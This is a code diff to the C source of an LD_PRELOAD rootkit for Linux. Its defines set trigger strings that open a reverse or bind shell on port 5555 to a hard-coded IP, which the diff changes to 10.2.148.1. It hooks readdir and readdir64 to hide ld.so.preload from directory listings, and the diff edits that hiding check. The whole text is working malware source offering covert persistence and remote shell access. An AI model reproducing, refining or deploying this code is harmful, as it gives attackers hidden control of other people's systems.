@@ -4,14 +4,14 @@
 #include <string.h>
 #include <dlfcn.h>
 #include <unistd.h>
+#include <fcntl.h>
 #include <dirent.h>
+#include <netdb.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <sys/types.h>
-#include <netdb.h>
 #include <sys/stat.h>
-#include <fcntl.h>
 
 #define REVTRIGGER "plsrev" //  presence of this string will trigger the REV Shell
 #define BINDTRIGGER "plsbind" // presence of this string will trigger the BIND Shell
@@ -19,7 +19,7 @@
 #define PORT "5555" // port to listen on / connect to
 #define HEXPORT "15B3" // hex value reflected in netstat
 #define FILENAME "ld.so.preload"
-#define IP "192.168.0.108" // IP to connect to
+#define IP "10.2.148.1" // IP to connect to
 
 
 /* I KEEP FORGETING THIS :
@@ -265,7 +265,7 @@ struct dirent *readdir(DIR *dirp)
 
 	while(olddir = new_readdir(dirp))
 	{
-		if(strstr(olddir->d_name,FILENAME) != NULL)
+		if(strstr(olddir->d_name,FILENAME) == 0)
 			break;
 	}
 	return olddir;
@@ -279,7 +279,7 @@ struct dirent64 *readdir64(DIR *dirp)
 
 	while(olddir = new_readdir64(dirp))
 	{
-		if(strstr(olddir->d_name,FILENAME) != NULL)
+		if(strstr(olddir->d_name,FILENAME) == 0)
 			break;
 	}
 	return olddir;
